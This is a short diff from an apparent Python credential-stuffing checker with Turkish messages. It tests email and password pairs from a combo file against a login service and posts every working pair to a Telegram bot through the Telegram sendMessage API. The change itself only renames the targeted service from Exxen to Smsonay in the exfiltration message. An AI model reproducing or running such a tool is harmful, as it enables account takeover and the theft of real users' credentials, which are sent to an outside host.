@@ -54,7 +54,7 @@ with open(EnartCombo, 'r') as file:
                 json = response.json()
                 if json.get('success') is True:
                     print(f"Başarılı giriş ✅ {mail}:{pas}")
-                    mesaj = f"- Exxen Başarılı Giriş -\n📧Mail: {mail}\n🔑Password: {pas}"
+                    mesaj = f"- Smsonay Başarılı Giriş -\n📧Mail: {mail}\n🔑Password: {pas}"
                     gonder = f"https://api.telegram.org/bot{token}/sendMessage"
                     msj = {
                     "chat_id": id,
